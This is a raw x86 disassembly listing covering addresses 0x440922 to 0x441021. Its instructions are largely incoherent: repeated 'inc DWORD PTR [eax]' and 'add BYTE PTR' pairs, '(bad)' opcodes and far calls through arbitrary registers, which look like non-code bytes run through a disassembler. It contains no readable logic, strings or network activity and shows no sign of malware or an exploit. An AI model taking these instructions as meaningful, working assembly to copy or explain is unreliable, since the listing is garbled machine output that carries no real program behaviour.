  440922:	call   DWORD PTR ds:0x1aff4014
  440928:	adc    al,0x30
  44092a:	call   FWORD PTR [edx]
  44092c:	and    eax,0x4724ffdb
  440931:	cli    
  440932:	inc    DWORD PTR [eax]
  440934:	add    BYTE PTR [ebx+0x5e0000ff],bl
  44093a:	inc    DWORD PTR [eax]
  44093c:	add    BYTE PTR ds:0x1b0000ff,dh
  440942:	inc    DWORD PTR [eax]
  440944:	add    BYTE PTR [ecx],cl
  440946:	inc    DWORD PTR [eax]
  440948:	add    BYTE PTR [esi],cl
  44094a:	inc    DWORD PTR [eax]
  44094c:	add    BYTE PTR ds:0x160000ff,cl
  440952:	inc    DWORD PTR [eax]
  440954:	add    BYTE PTR [edi+edi*8],ch
  440957:	add    BYTE PTR [eax],al
  440959:	push   eax
  44095a:	inc    DWORD PTR [eax]
  44095c:	add    BYTE PTR [ecx-0x17ffff01],al
  440962:	inc    DWORD PTR [eax]
  440964:	adc    eax,0x2506ffff
  440969:	out    dx,al
  44096a:	call   FWORD PTR [eax]
  44096c:	xor    edx,edx
  44096e:	dec    DWORD PTR [edx]
  440970:	pop    ss
  440971:	loope  0x440972
  440973:	add    BYTE PTR [esi*8-0x71ecff01],al
  44097a:	inc    DWORD PTR [eax]
  44097c:	add    BYTE PTR [ecx],dl
  44097e:	call   FWORD PTR [edx]
  440980:	pop    ss
  440981:	cmp    bh,bh
  440983:	sub    esp,DWORD PTR [edx]
  440985:	and    bh,bh
  440987:	pop    es
  440988:	or     ebx,edx
  44098a:	dec    DWORD PTR [esi]
  44098c:	and    BYTE PTR [edx+0x5d120dff],dh
  440992:	call   FWORD PTR [ecx]
  440994:	and    BYTE PTR [edi-0x1],cl
  440997:	add    al,0x20
  440999:	(bad)  
  44099b:	add    BYTE PTR [ecx],cl
  44099d:	ret    
  44099e:	inc    DWORD PTR [eax]
  4409a0:	add    BYTE PTR [esi+0x580000ff],al
  4409a6:	inc    DWORD PTR [eax]
  4409a8:	add    BYTE PTR [edi],dh
  4409aa:	inc    DWORD PTR [eax]
  4409ac:	add    BYTE PTR [edx],ah
  4409ae:	inc    DWORD PTR [eax]
  4409b0:	add    BYTE PTR [edx],bl
  4409b2:	inc    DWORD PTR [eax]
  4409b4:	add    BYTE PTR [esi],dl
  4409b6:	inc    DWORD PTR [eax]
  4409b8:	add    BYTE PTR [esi],bl
  4409ba:	inc    DWORD PTR [eax]
  4409bc:	add    BYTE PTR [edx],ch
  4409be:	inc    DWORD PTR [eax]
  4409c0:	add    BYTE PTR [ecx],bh
  4409c2:	inc    DWORD PTR [eax]
  4409c4:	add    BYTE PTR [ecx-0x1],ah
  4409c7:	add    DWORD PTR [eax],eax
  4409c9:	cwde   
  4409ca:	call   DWORD PTR [edi+ebx*2]
  4409cd:	(bad)  
  4409ce:	call   FWORD PTR ds:0x1bffd492
  4409d4:	pop    ss
  4409d5:	push   DWORD PTR gs:[edx]
  4409d8:	cmp    eax,0x392fff87
  4409dd:	mov    bh,bh
  4409df:	adc    DWORD PTR [ecx],edx
  4409e1:	aas    
  4409e2:	call   DWORD PTR [ebx]
  4409e4:	adc    DWORD PTR ds:0x4d1212ff,esi
  4409ea:	call   FWORD PTR [ecx]
  4409ec:	sbb    BYTE PTR [esi-0x1],dl
  4409ef:	sbb    ch,BYTE PTR [ebx+edi*4]
  4409f2:	jmp    DWORD PTR [edx]
  4409f4:	es mov esp,0xae2e29ff
  4409fa:	call   DWORD PTR [edi]
  4409fc:	sub    esi,DWORD PTR [ebp-0x1]
  4409ff:	adc    bl,BYTE PTR [esi]
  440a01:	dec    ecx
  440a02:	push   DWORD PTR [ecx+ebp*1]
  440a05:	cmp    eax,0x522930ff
  440a0a:	call   FWORD PTR [edi]
  440a0c:	and    DWORD PTR [ecx-0x1],esi
  440a0f:	sbb    ah,BYTE PTR [ebx]
  440a11:	cmp    bh,0x17
  440a14:	sub    eax,0x2d14ff7e
  440a19:	cmp    edi,0xff4e0e03
  440a1f:	adc    ah,BYTE PTR [esi]
  440a21:	jge    0x440a22
  440a23:	pop    ss
  440a24:	sub    esi,DWORD PTR [esi-0x1]
  440a27:	push   cs
  440a28:	and    eax,0x200ffbe
  440a2d:	test   al,0xff
  440a2f:	add    BYTE PTR [eax],al
  440a31:	jb     0x440a32
  440a33:	add    BYTE PTR [eax],al
  440a35:	inc    edi
  440a36:	inc    DWORD PTR [eax]
  440a38:	add    BYTE PTR [edx],ch
  440a3a:	inc    DWORD PTR [eax]
  440a3c:	add    BYTE PTR [ecx],bl
  440a3e:	inc    DWORD PTR [eax]
  440a40:	add    BYTE PTR [edi],dl
  440a42:	inc    DWORD PTR [eax]
  440a44:	add    BYTE PTR [ebx],bl
  440a46:	inc    DWORD PTR [eax]
  440a48:	add    BYTE PTR ds:0x1f0000ff,bl
  440a4e:	inc    DWORD PTR [eax]
  440a50:	add    BYTE PTR [esi],bl
  440a52:	inc    DWORD PTR [eax]
  440a54:	add    BYTE PTR [ecx],ah
  440a56:	inc    DWORD PTR [eax]
  440a58:	add    BYTE PTR [ebx],ah
  440a5a:	inc    DWORD PTR [eax]
  440a5c:	add    BYTE PTR [edx],ah
  440a5e:	inc    DWORD PTR [eax]
  440a60:	add    BYTE PTR [edx],ah
  440a62:	inc    DWORD PTR [eax]
  440a64:	add    BYTE PTR [esi],bl
  440a66:	inc    DWORD PTR [eax]
  440a68:	add    BYTE PTR [ebx],ah
  440a6a:	inc    DWORD PTR [eax]
  440a6c:	add    BYTE PTR [esi],ah
  440a6e:	inc    DWORD PTR [eax]
  440a70:	add    BYTE PTR [ebp-0x1],al
  440a73:	add    BYTE PTR [eax],al
  440a75:	inc    DWORD PTR fs:0x8ffcd1a
  440a7c:	das    
  440a7d:	sti    
  440a7e:	inc    DWORD PTR ds:0x1ffff17
  440a84:	push   ds
  440a85:	call   0xd64d0c89
  440a8a:	inc    DWORD PTR [eax]
  440a8c:	add    ch,al
  440a8e:	inc    DWORD PTR [eax]
  440a90:	add    ch,al
  440a92:	inc    DWORD PTR [eax]
  440a94:	add    ch,al
  440a96:	inc    DWORD PTR [eax]
  440a98:	add    ah,ah
  440a9a:	inc    DWORD PTR [eax]
  440a9c:	or     dl,bh
  440a9e:	dec    DWORD PTR [edi]
  440aa0:	sub    ecx,DWORD PTR [esi-0x5ce1ee01]
  440aa6:	inc    DWORD PTR [eax]
  440aa8:	add    dl,ah
  440aaa:	inc    DWORD PTR [eax]
  440aac:	add    dl,dh
  440aae:	inc    DWORD PTR [eax]
  440ab0:	add    eax,esi
  440ab2:	inc    DWORD PTR [eax]
  440ab4:	add    BYTE PTR [ebp+0x640000ff],dl
  440aba:	inc    DWORD PTR [eax]
  440abc:	add    BYTE PTR [edi],bh
  440abe:	inc    DWORD PTR [eax]
  440ac0:	add    BYTE PTR [edi],ah
  440ac2:	inc    DWORD PTR [eax]
  440ac4:	add    BYTE PTR ds:0x100000ff,dl
  440aca:	inc    DWORD PTR [eax]
  440acc:	add    BYTE PTR [edi+edi*8],dl
  440acf:	add    BYTE PTR [eax],al
  440ad1:	or     edi,edi
  440ad3:	add    BYTE PTR [eax],al
  440ad5:	pop    ds
  440ad6:	inc    DWORD PTR [eax]
  440ad8:	add    BYTE PTR ds:0x120000ff,bl
  440ade:	inc    DWORD PTR [eax]
  440ae0:	add    BYTE PTR [edi],cl
  440ae2:	inc    DWORD PTR [eax]
  440ae4:	add    BYTE PTR [esi],dl
  440ae6:	inc    DWORD PTR [eax]
  440ae8:	add    BYTE PTR [eax],ch
  440aea:	inc    DWORD PTR [eax]
  440aec:	add    BYTE PTR [edi+edi*8],bh
  440aef:	add    BYTE PTR [eax],al
  440af1:	inc    DWORD PTR gs:[eax]
  440af4:	add    eax,0xa00ffb1
  440af9:	loopne 0x440afa
  440afb:	or     bl,BYTE PTR [edx]
  440afd:	int3   
  440afe:	call   DWORD PTR [edx]
  440b00:	pop    ds
  440b01:	pop    ebx
  440b02:	dec    DWORD PTR ds:0xbff2314
  440b08:	and    eax,0x1b08ffa1
  440b0d:	mov    esi,0x601d0fff
  440b12:	dec    DWORD PTR ds:0xcff5818
  440b18:	push   ss
  440b19:	inc    edi
  440b1a:	dec    DWORD PTR [esp+ebx*1]
  440b1d:	pop    ebp
  440b1e:	jmp    DWORD PTR [ecx]
  440b20:	daa    
  440b21:	popa   
  440b22:	jmp    DWORD PTR [eax+eiz*1]
  440b25:	dec    ecx
  440b26:	call   FWORD PTR [eax]
  440b28:	or     al,0x37
  440b2a:	call   DWORD PTR [edx]
  440b2c:	sub    bl,bh
  440b2e:	jmp    FWORD PTR [ecx]
  440b30:	push   ecx
  440b31:	sti    
  440b32:	inc    DWORD PTR [eax]
  440b34:	add    BYTE PTR [edx+0x600000ff],bl
  440b3a:	inc    DWORD PTR [eax]
  440b3c:	add    BYTE PTR [ecx],bh
  440b3e:	inc    DWORD PTR [eax]
  440b40:	add    BYTE PTR [edx],bl
  440b42:	inc    DWORD PTR [eax]
  440b44:	add    BYTE PTR [eax],cl
  440b46:	inc    DWORD PTR [eax]
  440b48:	add    BYTE PTR [edx],cl
  440b4a:	inc    DWORD PTR [eax]
  440b4c:	add    BYTE PTR ds:0x130000ff,cl
  440b52:	inc    DWORD PTR [eax]
  440b54:	add    BYTE PTR [esi],ah
  440b56:	inc    DWORD PTR [eax]
  440b58:	add    BYTE PTR [ecx-0x1],cl
  440b5b:	add    BYTE PTR [eax],al
  440b5d:	js     0x440b5e
  440b5f:	add    ebx,DWORD PTR [edx]
  440b61:	loope  0x440b62
  440b63:	push   cs
  440b64:	sub    ecx,edx
  440b66:	inc    DWORD PTR [edx]
  440b68:	add    bl,bl
  440b6a:	call   FWORD PTR [esi]
  440b6c:	dec    edx
  440b6d:	mov    ebx,0xbc4104ff
  440b72:	inc    DWORD PTR [eax]
  440b74:	adc    eax,0xffdb
  440b79:	call   0xa262227d
  440b7e:	jmp    FWORD PTR [ebx]
  440b80:	ss mov edi,?
  440b83:	pop    ds
  440b84:	sbb    ebp,DWORD PTR [edi]
  440b86:	call   FWORD PTR [edx]
  440b88:	pop    ss
  440b89:	cmp    al,0xff
  440b8b:	adc    dl,BYTE PTR [ecx]
  440b8d:	dec    WORD PTR [edx]
  440b90:	or     ah,BYTE PTR [edi+0x521b17ff]
  440b96:	inc    DWORD PTR [ecx]
  440b98:	and    eax,0x1001ffea
  440b9d:	fdivp  st(7),st
  440b9f:	add    BYTE PTR [eax],al
  440ba1:	cmp    edi,0x0
  440ba4:	add    BYTE PTR [edi-0x1],cl
  440ba7:	add    BYTE PTR [eax],al
  440ba9:	daa    
  440baa:	inc    DWORD PTR [eax]
  440bac:	add    BYTE PTR [eax],bl
  440bae:	inc    DWORD PTR [eax]
  440bb0:	add    BYTE PTR [edi+edi*8],dl
  440bb3:	add    BYTE PTR [eax],al
  440bb5:	push   ss
  440bb6:	inc    DWORD PTR [eax]
  440bb8:	add    BYTE PTR [esi],bl
  440bba:	inc    DWORD PTR [eax]
  440bbc:	add    BYTE PTR [esi],ah
  440bbe:	inc    DWORD PTR [eax]
  440bc0:	add    BYTE PTR [edi],dh
  440bc2:	inc    DWORD PTR [eax]
  440bc4:	add    BYTE PTR [edi+edi*8+0x0],dl
  440bc8:	add    BYTE PTR [esi-0x1],bh
  440bcb:	add    al,0x0
  440bcd:	mov    edx,0xe18524ff
  440bd2:	jmp    DWORD PTR [edi]
  440bd4:	push   edi
  440bd5:	xchg   ebx,eax
  440bd6:	call   FWORD PTR [eax]
  440bd8:	push   cs
  440bd9:	dec    DWORD PTR ds:[ebx]
  440bdc:	adc    eax,0x1915ff63
  440be1:	push   esi
  440be2:	call   DWORD PTR [esi]
  440be4:	adc    eax,0x1315ff41
  440be9:	aaa    
  440bea:	dec    DWORD PTR ds:0x17ff300b
  440bf0:	pop    ds
  440bf1:	call   DWORD PTR [bp+di]
  440bf4:	pop    ds
  440bf5:	(bad)  
  440bf6:	jmp    FWORD PTR [ebx]
  440bf8:	and    BYTE PTR [esi-0x1],dh
  440bfb:	pop    ds
  440bfc:	sub    DWORD PTR [ecx+0x622a25ff],edx
  440c02:	jmp    FWORD PTR [edi]
  440c04:	cs push ecx
  440c06:	push   DWORD PTR [esp+ebp*1]
  440c09:	inc    ebp
  440c0a:	call   FWORD PTR [ebx]
  440c0c:	sbb    BYTE PTR [eax-0x1],ch
  440c0f:	add    BYTE PTR [edi],al
  440c11:	xchg   edx,eax
  440c12:	dec    DWORD PTR [eax]
  440c14:	sbb    ebx,DWORD PTR [ecx-0x1]
  440c17:	pop    ss
  440c18:	xor    eax,DWORD PTR [eax+0x661a0aff]
  440c1e:	call   DWORD PTR [eax]
  440c20:	and    BYTE PTR [eax-0x1],bh
  440c23:	sbb    BYTE PTR [eax+eax*4],ch
  440c26:	dec    DWORD PTR [eax+ebp*1]
  440c29:	retf   0xff
  440c2c:	add    ah,BYTE PTR [edi+0x6c0000ff]
  440c32:	inc    DWORD PTR [eax]
  440c34:	add    BYTE PTR [edi+edi*8+0x0],cl
  440c38:	add    BYTE PTR ds:0x1b0000ff,dh
  440c3e:	inc    DWORD PTR [eax]
  440c40:	add    BYTE PTR [ebx],dl
  440c42:	inc    DWORD PTR [eax]
  440c44:	add    BYTE PTR ds:0x200000ff,bl
  440c4a:	inc    DWORD PTR [eax]
  440c4c:	add    BYTE PTR [edi],bl
  440c4e:	inc    DWORD PTR [eax]
  440c50:	add    BYTE PTR [ebx],bl
  440c52:	inc    DWORD PTR [eax]
  440c54:	add    BYTE PTR [esi],dl
  440c56:	inc    DWORD PTR [eax]
  440c58:	add    BYTE PTR [ecx],bl
  440c5a:	inc    DWORD PTR [eax]
  440c5c:	add    BYTE PTR [edx],ah
  440c5e:	inc    DWORD PTR [eax]
  440c60:	add    BYTE PTR [ebx],bl
  440c62:	inc    DWORD PTR [eax]
  440c64:	add    BYTE PTR [eax],ah
  440c66:	inc    DWORD PTR [eax]
  440c68:	add    BYTE PTR [edx],ch
  440c6a:	inc    DWORD PTR [eax]
  440c6c:	add    BYTE PTR [edi+edi*8],dh
  440c6f:	add    BYTE PTR [eax],al
  440c71:	dec    ebp
  440c72:	inc    DWORD PTR [eax]
  440c74:	add    BYTE PTR [ebx-0x1],dh
  440c77:	add    cl,BYTE PTR [edi]
  440c79:	(bad)  
  440c7a:	inc    DWORD PTR [ecx]
  440c7c:	sbb    esp,ecx
  440c7e:	inc    DWORD PTR [eax]
  440c80:	inc    ecx
  440c81:	idiv   edi
  440c83:	add    BYTE PTR [eax],dh
  440c85:	std    
  440c86:	inc    DWORD PTR [eax]
  440c88:	xor    edx,edi
  440c8a:	inc    DWORD PTR [eax]
  440c8c:	or     ebp,edx
  440c8e:	inc    DWORD PTR [eax]
  440c90:	add    ah,al
  440c92:	inc    DWORD PTR [eax]
  440c94:	add    ah,al
  440c96:	inc    DWORD PTR [eax]
  440c98:	add    ch,al
  440c9a:	inc    DWORD PTR [eax]
  440c9c:	add    ch,cl
  440c9e:	inc    DWORD PTR [eax]
  440ca0:	or     al,0xdd
  440ca2:	inc    DWORD PTR [eax]
  440ca4:	adc    dh,ah
  440ca6:	inc    DWORD PTR [eax]
  440ca8:	add    dl,dh
  440caa:	inc    DWORD PTR [eax]
  440cac:	add    dl,bl
  440cae:	inc    DWORD PTR [eax]
  440cb0:	add    ah,dh
  440cb2:	inc    DWORD PTR [eax]
  440cb4:	add    dl,BYTE PTR [esi+0x5a0000ff]
  440cba:	inc    DWORD PTR [eax]
  440cbc:	add    BYTE PTR [edi+edi*8],bh
  440cbf:	add    BYTE PTR [eax],al
  440cc1:	sub    bh,bh
  440cc3:	add    BYTE PTR [eax],al
  440cc5:	pop    ss
  440cc6:	inc    DWORD PTR [eax]
  440cc8:	add    BYTE PTR [ebx],dl
  440cca:	inc    DWORD PTR [eax]
  440ccc:	add    BYTE PTR [esi],bl
  440cce:	inc    DWORD PTR [eax]
  440cd0:	add    BYTE PTR [edi+edi*8],dl
  440cd3:	add    BYTE PTR [eax],al
  440cd5:	adc    eax,0x200000ff
  440cda:	inc    DWORD PTR [eax]
  440cdc:	add    BYTE PTR [eax],bl
  440cde:	inc    DWORD PTR [eax]
  440ce0:	add    BYTE PTR ds:0x1b0000ff,dl
  440ce6:	inc    DWORD PTR [eax]
  440ce8:	add    BYTE PTR ds:0x420000ff,ah
  440cee:	inc    DWORD PTR [eax]
  440cf0:	add    DWORD PTR [eax-0x1],ebp
  440cf3:	add    BYTE PTR [ecx],cl
  440cf5:	(bad)  
  440cf6:	inc    DWORD PTR [eax]
  440cf8:	or     edi,ebx
  440cfa:	dec    DWORD PTR [edx]
  440cfc:	pop    ss
  440cfd:	mov    esi,0xa0707ff
  440d02:	dec    DWORD PTR [ebx]
  440d04:	push   cs
  440d05:	push   ecx
  440d06:	dec    DWORD PTR [edi]
  440d08:	and    DWORD PTR [ecx+0x79211aff],esi
  440d0e:	dec    DWORD PTR [eax]
  440d10:	adc    dl,BYTE PTR [edx+0x6f240eff]
  440d16:	dec    DWORD PTR [edx]
  440d18:	sbb    DWORD PTR [ebp-0x1],ecx
  440d1b:	adc    BYTE PTR ds:0x1810ff6e,ah
  440d21:	pusha  
  440d22:	inc    DWORD PTR [ebx]
  440d24:	add    BYTE PTR [ecx],ah
  440d26:	inc    DWORD PTR [ebx]
  440d28:	add    BYTE PTR [ebx],ah
  440d2a:	call   FWORD PTR [eax]
  440d2c:	cmp    bh,bh
  440d2e:	jmp    FWORD PTR [esi]
  440d30:	pop    esp
  440d31:	sti    
  440d32:	inc    DWORD PTR [eax]
  440d34:	add    BYTE PTR [ecx+0x600000ff],bl
  440d3a:	inc    DWORD PTR [eax]
  440d3c:	add    BYTE PTR [ebx],dh
  440d3e:	inc    DWORD PTR [eax]
  440d40:	add    BYTE PTR ds:0x80000ff,bl
  440d46:	inc    DWORD PTR [eax]
  440d48:	add    BYTE PTR [edi+edi*8],cl
  440d4b:	add    BYTE PTR [eax],al
  440d4d:	or     bh,bh
  440d4f:	add    BYTE PTR [eax],al
  440d51:	adc    edi,edi
  440d53:	add    BYTE PTR [eax],al
  440d55:	and    al,0xff
  440d57:	add    BYTE PTR [eax],al
  440d59:	inc    ecx
  440d5a:	inc    DWORD PTR [eax]
  440d5c:	add    BYTE PTR [ecx-0x1],dh
  440d5f:	add    cl,BYTE PTR [ecx+edx*8]
  440d62:	dec    DWORD PTR [esi]
  440d64:	and    al,0x4a
  440d66:	inc    DWORD PTR ds:0x12ff5913
  440d6c:	cmp    ecx,edx
  440d6e:	inc    DWORD PTR [esi]
  440d70:	inc    ebx
  440d71:	enter  0x10ff,0x51
  440d75:	mov    eax,0xc72f16ff
  440d7a:	call   FWORD PTR [eax]
  440d7c:	push   ss
  440d7d:	mov    esi,0xa34b3aff
  440d82:	jmp    DWORD PTR [esi]
  440d84:	and    dh,BYTE PTR [ecx-0x1]
  440d87:	sbb    edx,DWORD PTR [edi]
  440d89:	call   FWORD PTR ss:0x10ff5a1d
  440d90:	or     bh,BYTE PTR [edx]
  440d92:	call   DWORD PTR [esp+edx*1]
  440d95:	push   eax
  440d96:	inc    DWORD PTR [eax]
  440d98:	es clc 
  440d9a:	inc    DWORD PTR [eax]
  440d9c:	push   cs
  440d9d:	fdivp  st(7),st
  440d9f:	add    BYTE PTR [eax],al
  440da1:	cmp    edi,0x0
  440da4:	add    BYTE PTR [ebx-0x1],dl
  440da7:	add    BYTE PTR [eax],al
  440da9:	sub    eax,0x1b0000ff
  440dae:	inc    DWORD PTR [eax]
  440db0:	add    BYTE PTR [edx],dl
  440db2:	inc    DWORD PTR [eax]
  440db4:	add    BYTE PTR [edx],dl
  440db6:	inc    DWORD PTR [eax]
  440db8:	add    BYTE PTR [ecx],bl
  440dba:	inc    DWORD PTR [eax]
  440dbc:	add    BYTE PTR [ebx],bl
  440dbe:	inc    DWORD PTR [eax]
  440dc0:	add    BYTE PTR [edi+edi*8],ah
  440dc3:	add    BYTE PTR [eax],al
  440dc5:	cmp    eax,0x5f0000ff
  440dca:	inc    DWORD PTR [eax]
  440dcc:	add    BYTE PTR [edi-0x3df1f901],al
  440dd2:	call   FWORD PTR [eax]
  440dd4:	imul   ebx,ecx,0x772922ff
  440dda:	call   FWORD PTR ds:0x13ff451e
  440de0:	adc    DWORD PTR [ebx],esi
  440de2:	call   FWORD PTR [edi+ebx*1]
  440de5:	push   esi
  440de6:	call   FWORD PTR [eax]
  440de8:	sbb    DWORD PTR [ebp-0x1],ecx
  440deb:	adc    al,0x14
  440ded:	inc    ecx
  440dee:	call   FWORD PTR [ecx+ebx*1]
  440df1:	xor    eax,0x370000ff
  440df6:	call   DWORD PTR [eax]
  440df8:	or     ebx,DWORD PTR [ebx-0x1]
  440dfb:	sbb    BYTE PTR [esi],dl
  440dfd:	pop    esi
  440dfe:	jmp    DWORD PTR [edi]
  440e00:	and    al,0x50
  440e02:	jmp    FWORD PTR [edi]
  440e04:	and    eax,0x2a31ff45
  440e09:	inc    edi
  440e0a:	jmp    FWORD PTR ds:0xff522b
  440e10:	add    BYTE PTR [ebx-0x1],dl
  440e13:	add    BYTE PTR [eax],al
  440e15:	call   0x7ff:0x8e3116ff
  440e1c:	pop    ss
  440e1d:	dec    edi
  440e1e:	inc    DWORD PTR [edi]
  440e20:	push   ss
  440e21:	(bad)  
  440e22:	call   DWORD PTR [ecx+eiz*1]
  440e25:	push   0xbd290fff
  440e2a:	inc    DWORD PTR [eax]
  440e2c:	add    ch,BYTE PTR [ecx+0x6e0000ff]
  440e32:	inc    DWORD PTR [eax]
  440e34:	add    BYTE PTR [edi+edi*8],bh
  440e37:	add    BYTE PTR [eax],al
  440e39:	sub    bh,bh
  440e3b:	add    BYTE PTR [eax],al
  440e3d:	and    edi,edi
  440e3f:	add    BYTE PTR [eax],al
  440e41:	sbb    bh,bh
  440e43:	add    BYTE PTR [eax],al
  440e45:	pop    ss
  440e46:	inc    DWORD PTR [eax]
  440e48:	add    BYTE PTR [ecx],bl
  440e4a:	inc    DWORD PTR [eax]
  440e4c:	add    BYTE PTR [edi+edi*8],bl
  440e4f:	add    BYTE PTR [eax],al
  440e51:	pop    ds
  440e52:	inc    DWORD PTR [eax]
  440e54:	add    BYTE PTR [ecx],bl
  440e56:	inc    DWORD PTR [eax]
  440e58:	add    BYTE PTR [ecx],bl
  440e5a:	inc    DWORD PTR [eax]
  440e5c:	add    BYTE PTR [eax],ah
  440e5e:	inc    DWORD PTR [eax]
  440e60:	add    BYTE PTR [ebx],bl
  440e62:	inc    DWORD PTR [eax]
  440e64:	add    BYTE PTR [eax],bl
  440e66:	inc    DWORD PTR [eax]
  440e68:	add    BYTE PTR ds:0x390000ff,bl
  440e6e:	inc    DWORD PTR [eax]
  440e70:	add    BYTE PTR [edi+edi*8+0x0],dl
  440e74:	add    BYTE PTR [ebx-0x33ecfd01],al
  440e7a:	call   DWORD PTR [edi]
  440e7c:	inc    edx
  440e7d:	(bad)  
  440e7e:	jmp    DWORD PTR ds:0x1affec51
  440e84:	addr16 fdivr st,st(7)
  440e87:	sbb    ch,BYTE PTR [ecx+ebx*8-0x1]
  440e8b:	and    eax,0xaffee5b
  440e90:	sub    al,0xef
  440e92:	inc    DWORD PTR [ecx]
  440e94:	or     ecx,edi
  440e96:	inc    DWORD PTR [eax]
  440e98:	add    bl,al
  440e9a:	inc    DWORD PTR [eax]
  440e9c:	add    ah,al
  440e9e:	inc    DWORD PTR [eax]
  440ea0:	add    cl,cl
  440ea2:	inc    DWORD PTR [eax]
  440ea4:	pop    es
  440ea5:	fdiv   st(7),st
  440ea7:	add    DWORD PTR [edx],eax
  440ea9:	in     eax,0xff
  440eab:	add    DWORD PTR [esi],eax
  440ead:	(bad)  
  440eae:	inc    DWORD PTR [eax]
  440eb0:	add    bl,ch
  440eb2:	inc    DWORD PTR [ecx]
  440eb4:	add    dh,BYTE PTR [esi-0x1]
  440eb7:	add    BYTE PTR [eax],al
  440eb9:	dec    edi
  440eba:	inc    DWORD PTR [eax]
  440ebc:	add    BYTE PTR [edi],dh
  440ebe:	inc    DWORD PTR [eax]
  440ec0:	add    BYTE PTR [edi+edi*8],ah
  440ec3:	add    BYTE PTR [eax],al
  440ec5:	sbb    bh,bh
  440ec7:	add    BYTE PTR [eax],al
  440ec9:	sbb    edi,edi
  440ecb:	add    BYTE PTR [eax],al
  440ecd:	and    bh,bh
  440ecf:	add    BYTE PTR [eax],al
  440ed1:	sbb    edi,edi
  440ed3:	add    BYTE PTR [eax],al
  440ed5:	sbb    bh,bh
  440ed7:	add    BYTE PTR [eax],al
  440ed9:	sbb    edi,edi
  440edb:	add    BYTE PTR [eax],al
  440edd:	adc    eax,0x140000ff
  440ee2:	inc    DWORD PTR [eax]
  440ee4:	add    BYTE PTR [ebx],bl
  440ee6:	inc    DWORD PTR [eax]
  440ee8:	add    BYTE PTR [eax],ch
  440eea:	inc    DWORD PTR [eax]
  440eec:	add    BYTE PTR [edx-0x1],al
  440eef:	add    BYTE PTR [eax],al
  440ef1:	push   0xba0600ff
  440ef6:	inc    DWORD PTR [eax]
  440ef8:	or     edx,ebx
  440efa:	call   DWORD PTR [eax]
  440efc:	adc    ecx,DWORD PTR [ebp-0x1]
  440eff:	or     BYTE PTR [eax],cl
  440f01:	dec    ecx
  440f02:	dec    DWORD PTR [ecx]
  440f04:	or     edi,DWORD PTR [ecx-0x1]
  440f07:	adc    al,0x1e
  440f09:	dec    ebx
  440f0a:	call   DWORD PTR [ebx*1+0xa06ff35]
  440f11:	push   0xffffffff
  440f13:	add    dl,BYTE PTR ds:0x240fffd3
  440f19:	pusha  
  440f1a:	dec    DWORD PTR [eax]
  440f1c:	push   cs
  440f1d:	sub    edi,edi
  440f1f:	pop    ss
  440f20:	sub    DWORD PTR [ebx+0x631e0bff],eax
  440f26:	inc    DWORD PTR [edx]
  440f28:	add    BYTE PTR [edx],dl
  440f2a:	call   FWORD PTR [eax]
  440f2c:	cs (bad) 
  440f2e:	jmp    DWORD PTR [ecx]
  440f30:	inc    edi
  440f31:	sti    
  440f32:	inc    DWORD PTR [eax]
  440f34:	add    BYTE PTR [edx+0x5f0000ff],bl
  440f3a:	inc    DWORD PTR [eax]
  440f3c:	add    BYTE PTR [edi+edi*8],dh
  440f3f:	add    BYTE PTR [eax],al
  440f41:	sbb    bh,bh
  440f43:	add    BYTE PTR [eax],al
  440f45:	or     bh,bh
  440f47:	add    BYTE PTR [eax],al
  440f49:	or     bh,bh
  440f4b:	add    BYTE PTR [eax],al
  440f4d:	or     edi,edi
  440f4f:	add    BYTE PTR [eax],al
  440f51:	push   cs
  440f52:	inc    DWORD PTR [eax]
  440f54:	add    BYTE PTR [edx],ah
  440f56:	inc    DWORD PTR [eax]
  440f58:	add    BYTE PTR [eax-0x1],al
  440f5b:	add    BYTE PTR [eax],al
  440f5d:	push   0xffffffff
  440f5f:	add    BYTE PTR [eax],al
  440f61:	mov    esp,0x990d0cff
  440f66:	dec    DWORD PTR ds:0x1bffb213
  440f6c:	cmp    ebx,esi
  440f6e:	push   DWORD PTR [ebx*2+0x4320ffad]
  440f75:	mov    al,ds:0xa55832ff
  440f7a:	call   DWORD PTR [edi]
  440f7c:	and    edx,DWORD PTR [esi-0x5ed7da01]
  440f82:	push   DWORD PTR ds:0x23ff7d3b
  440f88:	and    BYTE PTR [ecx-0x1],dl
  440f8b:	and    BYTE PTR [esi],bl
  440f8d:	imul   edi,edi,0xff150f16
  440f93:	adc    dl,BYTE PTR [edi]
  440f95:	push   0xffffffff
  440f97:	add    DWORD PTR ds:0x1706ffff,esp
  440f9d:	mov    eax,0x830000ff
  440fa2:	inc    DWORD PTR [eax]
  440fa4:	add    BYTE PTR [ebx-0x1],dl
  440fa7:	add    BYTE PTR [eax],al
  440fa9:	das    
  440faa:	inc    DWORD PTR [eax]
  440fac:	add    BYTE PTR [eax],bl
  440fae:	inc    DWORD PTR [eax]
  440fb0:	add    BYTE PTR [ecx],dl
  440fb2:	inc    DWORD PTR [eax]
  440fb4:	add    BYTE PTR [edx],dl
  440fb6:	inc    DWORD PTR [eax]
  440fb8:	add    BYTE PTR [edi],dl
  440fba:	inc    DWORD PTR [eax]
  440fbc:	add    BYTE PTR [edi+edi*8],bl
  440fbf:	add    BYTE PTR [eax],al
  440fc1:	and    bh,bh
  440fc3:	add    BYTE PTR [eax],al
  440fc5:	sub    al,0xff
  440fc7:	add    BYTE PTR [eax],al
  440fc9:	inc    edx
  440fca:	inc    DWORD PTR [eax]
  440fcc:	add    BYTE PTR [eax-0x1],ah
  440fcf:	add    BYTE PTR [eax],al
  440fd1:	mov    edi,edi
  440fd3:	pop    es
  440fd4:	sbb    ecx,esp
  440fd6:	dec    DWORD PTR [edx]
  440fd8:	xor    bl,ah
  440fda:	call   DWORD PTR [ebx*1+0x1117ffa0]
  440fe1:	sub    eax,0x341318ff
  440fe6:	call   FWORD PTR [esi]
  440fe8:	and    BYTE PTR [ebp-0x1],dl
  440feb:	sub    ebp,DWORD PTR [ebx]
  440fed:	push   ebp
  440fee:	jmp    FWORD PTR [ecx]
  440ff0:	and    cl,BYTE PTR [edx-0x1]
  440ff3:	adc    al,0x11
  440ff5:	sub    eax,0x611e0eff
  440ffa:	inc    DWORD PTR [ecx]
  440ffc:	adc    DWORD PTR [edx+0x721115ff],esi
  441002:	jmp    FWORD PTR ds:0x36ff5f31
  441008:	sub    eax,DWORD PTR [edx-0x1]
  44100b:	das    
  44100c:	es inc ebp
  44100e:	call   DWORD PTR [eax]
  441010:	adc    DWORD PTR ds:0x64292eff,ebp
  441016:	call   DWORD PTR [edi]
  441018:	adc    al,0xa4
  44101a:	dec    DWORD PTR [edx+edx*1]
  44101d:	popa   
  44101e:	dec    DWORD PTR [ebx+ebx*1]
  441021:	pop    esi
